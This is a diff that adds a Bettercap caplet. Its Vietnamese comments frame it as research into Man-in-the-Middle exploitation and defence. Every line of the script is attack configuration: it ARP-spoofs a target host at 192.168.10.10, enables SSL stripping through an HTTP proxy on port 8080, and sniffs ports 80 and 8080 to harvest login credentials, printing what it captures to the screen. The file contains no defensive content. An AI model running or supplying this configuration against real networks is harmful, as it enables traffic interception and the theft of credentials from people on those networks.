@@ -1,0 +1,22 @@
+# Bettercap Caplet: SSL Stripping & Credential Harvesting
+# Đề tài: Nghiên cứu kỹ thuật khai thác và phòng chống tấn công Man-in-the-Middle
+
+# 1. Cấu hình mục tiêu ARP Spoofing
+set arp.spoof.targets 192.168.10.10
+set arp.spoof.internal true
+
+# 2. Kích hoạt mô-đun bóc tách SSL (SSL Strip)
+set http.proxy.sslstrip true
+set http.proxy.port 8080
+
+# 3. Kích hoạt tính năng phân tích và trích xuất thông tin đăng nhập HTTP
+set net.sniff.verbose true
+set net.sniff.filter "tcp port 80 or tcp port 8080"
+
+# 4. Khởi chạy các mô-đun
+arp.spoof on
+http.proxy on
+net.sniff on
+
+# Ghi log kết quả bắt được ra màn hình
+events.stream on
